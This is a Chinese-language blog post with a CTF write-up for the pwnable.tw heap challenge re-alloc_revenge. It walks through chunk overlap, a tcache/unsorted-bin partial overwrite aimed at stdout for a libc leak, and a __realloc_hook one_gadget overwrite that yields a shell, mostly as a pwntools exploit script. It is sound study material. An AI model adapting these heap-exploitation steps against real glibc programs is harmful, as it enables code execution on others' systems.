<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>pwnable.tw re-alloc_revenge | hhdx's blog</title>
<meta name=keywords content="CTF"><meta name=description content="题目分析
防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
总体思路
程序没有show函数，所以通过修改stdout的方式泄露libc。
将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
最后修改__realloc_hook为one_gadget得到shell。
主要难点在布局构造。"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="pwnable.tw re-alloc_revenge"><meta property="og:description" content="题目分析 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
总体思路 程序没有show函数，所以通过修改stdout的方式泄露libc。
将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
最后修改__realloc_hook为one_gadget得到shell。
主要难点在布局构造。"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-09-07T14:48:20+00:00"><meta property="article:modified_time" content="2020-09-07T14:48:20+00:00"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="pwnable.tw re-alloc_revenge"><meta name=twitter:description content="题目分析
防护比re-alloc多了FULL RELRO和PIE。其他没有改变。
总体思路
程序没有show函数，所以通过修改stdout的方式泄露libc。
将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。
最后修改__realloc_hook为one_gadget得到shell。
主要难点在布局构造。"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"pwnable.tw re-alloc_revenge","item":"https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"pwnable.tw re-alloc_revenge","name":"pwnable.tw re-alloc_revenge","description":"题目分析 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。\n总体思路 程序没有show函数，所以通过修改stdout的方式泄露libc。\n将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。\n最后修改__realloc_hook为one_gadget得到shell。\n主要难点在布局构造。\n","keywords":["CTF"],"articleBody":"题目分析 防护比re-alloc多了FULL RELRO和PIE。其他没有改变。\n总体思路 程序没有show函数，所以通过修改stdout的方式泄露libc。\n将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。\n最后修改__realloc_hook为one_gadget得到shell。\n主要难点在布局构造。\npartial overwrite指向stdout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 将chunk(0x70)分割成0x20和0x50的两块，造成overlap # 便于后续修改chunk(0x50)的size allocate(0, 0x68, \"A\") realloc(0, 0, \"\") realloc(0, 0x18, \"A\") free(0) # double free chunk(0x50) allocate(0, 0x48, \"B\") realloc(0, 0, \"\") realloc(0, 0x48, \"B\"*0x10) free(0) # 修改chunk(0x50)的size allocate(0, 0x48, \"C\") allocate(1, 0x68, b\"C\"*0x18+p64(0x451)) free(1) # bypass prev_inuse(nextchunk) check in free function for i in range(9): allocate(1, 0x58, \"D\") realloc(1, 0x78, \"D\") free(1) # free to unsorted bin realloc(0, 0, \"\") # partial overwrite to stdout realloc(0, 0x38, b\"\\x60\\xa7\") tips 本地写exploit的时候，可以在process中指定参数aslr=False，禁用随机化，避免爆破，便于调试。\nexploit exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 #!/usr/bin/env python3 from pwn import * context(os=\"linux\", arch=\"amd64\", log_level=\"debug\") localfile = \"./re-alloc_revenge\" locallibc = \"./libc.so.6\" pf = lambda name,num :log.info(name + \": 0x%x\" % num) g = lambda x :next(libc.search(asm(x))) def allocate(idx, size, data): io.recvuntil(\"Your choice:\") io.sendline(\"1\") io.recvuntil(\"Index:\") io.sendline(str(idx)) io.recvuntil(\"Size:\") io.sendline(str(size)) io.recvuntil(\"Data:\") io.send(data) def realloc(idx, size, data): io.recvuntil(\"Your choice:\") io.sendline(\"2\") io.recvuntil(\"Index:\") io.sendline(str(idx)) io.recvuntil(\"Size:\") io.sendline(str(size)) if size != 0: io.recvuntil(\"Data:\") io.send(data) def free(idx): io.recvuntil(\"Your choice:\") io.sendline(\"3\") io.recvuntil(\"Index:\") io.sendline(str(idx)) def exp(): one_gadget = 0x106ef8 allocate(0, 0x48, \"A\") free(0) allocate(0, 0x68, \"A\") realloc(0, 0, \"\") realloc(0, 0x18, \"A\") free(0) allocate(0, 0x48, \"B\") realloc(0, 0, \"\") realloc(0, 0x48, \"B\"*0x10) free(0) allocate(0, 0x48, \"C\") allocate(1, 0x68, b\"C\"*0x18+p64(0x451)) free(1) for i in range(9): allocate(1, 0x58, \"D\") realloc(1, 0x78, \"D\") free(1) # 0x60 count++ allocate(1, 0x58, \"A\") free(1) realloc(0, 0, \"\") realloc(0, 0x38, b\"\\x60\\xa7\") # gdb.attach(io, \"\"\"b menu # b read_input # \"\"\") allocate(1, 0x48, \"E\") realloc(1, 0x18, \"E\") free(1) realloc(0, 0x18, \"E\"*0x10) free(0) # gdb.attach(io, \"b menu\") allocate(0, 0x48, p64(0xfbad1800)+p64(0)*2+b\"leak:\".rjust(8, b\"\\x00\")) if len(io.recvuntil(\"leak:\", timeout=1)) == 0: log.debug(\"failed\") return libc_base = u64(io.recv(8)) - 0x1E5700 pf(\"libc_base\", libc_base) # gdb.attach(io, \"b menu\") allocate(1, 0x78, \"F\") realloc(1, 0, \"\") realloc(1, 0x18, \"F\"*0x10) free(1) # gdb.attach(io, \"b menu\") allocate(1, 0x78, b\"F\"*0x18+p64(0x61)+p64(libc_base+libc.sym[\"__realloc_hook\"])) free(1) allocate(1, 0x58, \"G\") realloc(1, 0x28, \"G\") free(1) # gdb.attach(io, \"b realloc\") # allocate(1, 0x58, p64(libc_base+libc.sym[\"malloc\"])+p64(libc_base+one_gadget)) allocate(1, 0x58, p64(libc_base+one_gadget)) io.recvuntil(\"Your choice: \") io.sendline(\"2\") io.recvuntil(\"Index:\") io.sendline(\"1\") io.recvuntil(\"Size:\") io.sendline(str(0x58)) io.interactive() elf = ELF(localfile) libc = ELF(locallibc) while True: # if True: try: print(\"----------------------------------------------------------\") argc = len(sys.argv) if argc == 1: # io = process(localfile, aslr=False) io = process(localfile) else: if argc == 2: host, port = sys.argv[1].split(\":\") elif argc == 3: host = sys.argv[1] port = sys.argv[2] io = remote(host, port) exp() except: io.close() ref https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0\nhttp://blog.eonew.cn/archives/1190\n","wordCount":"861","inLanguage":"zh-cn","datePublished":"2020-09-07T14:48:20Z","dateModified":"2020-09-07T14:48:20Z","author":{"@type":"Person","name":"hhdx"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hhdx.xyz/post/pwnable-tw-re-alloc-revenge/"},"publisher":{"@type":"Organization","name":"hhdx's blog","logo":{"@type":"ImageObject","url":"https://hhdx.xyz/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hhdx.xyz/ accesskey=h title="hhdx's blog (Alt + H)">hhdx's blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hhdx.xyz/ title=主页><span>主页</span></a></li><li><a href=https://hhdx.xyz/post/ title=归档><span>归档</span></a></li><li><a href=https://hhdx.xyz/tags/ title=标签><span>标签</span></a></li><li><a href=https://hhdx.xyz/underway/ title=施工中><span>施工中</span></a></li><li><a href=https://hhdx.xyz/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">pwnable.tw re-alloc_revenge</h1><div class=post-meta><span title='2020-09-07 14:48:20 +0000 UTC'>September 7, 2020</span>&nbsp;·&nbsp;hhdx</div></header><div class=post-content><h2 id=题目分析>题目分析<a hidden class=anchor aria-hidden=true href=#题目分析>#</a></h2><p>防护比<a href=https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/>re-alloc</a>多了FULL RELRO和PIE。其他没有改变。</p><h2 id=总体思路>总体思路<a hidden class=anchor aria-hidden=true href=#总体思路>#</a></h2><p>程序没有show函数，所以通过修改stdout的方式泄露libc。</p><p>将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。</p><p>最后修改<code>__realloc_hook</code>为one_gadget得到shell。</p><p>主要难点在布局构造。</p><h2 id=partial-overwrite指向stdout>partial overwrite指向stdout<a hidden class=anchor aria-hidden=true href=#partial-overwrite指向stdout>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 将chunk(0x70)分割成0x20和0x50的两块，造成overlap</span>
</span></span><span class=line><span class=cl><span class=c1># 便于后续修改chunk(0x50)的size</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># double free chunk(0x50)</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 修改chunk(0x50)的size</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># bypass prev_inuse(nextchunk) check in free function</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># free to unsorted bin</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># partial overwrite to stdout</span>
</span></span><span class=line><span class=cl><span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=tips>tips<a hidden class=anchor aria-hidden=true href=#tips>#</a></h2><p>本地写exploit的时候，可以在process中指定参数<code>aslr=False</code>，禁用随机化，避免爆破，便于调试。</p><h2 id=exploit>exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h2><p><a href=https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc_revenge/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./re-alloc_revenge&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;./libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>allocate</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>realloc</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Data:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x106ef8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;C&#34;</span><span class=p>)</span>
